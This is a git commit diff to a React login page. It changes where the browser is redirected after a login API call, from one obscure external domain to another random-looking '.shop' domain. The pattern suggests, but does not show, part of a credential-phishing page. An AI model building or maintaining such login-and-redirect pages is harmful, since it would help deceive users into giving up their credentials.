5672fc5392901b7e4e84778a8afef36a0e2adc45
husknet <127146284+husknet@users.noreply.github.com>
2025-05-07 12:24:20 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sgg.lccbss.com/';
+      window.location.href = 'https://pxr.tobeshiesty.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
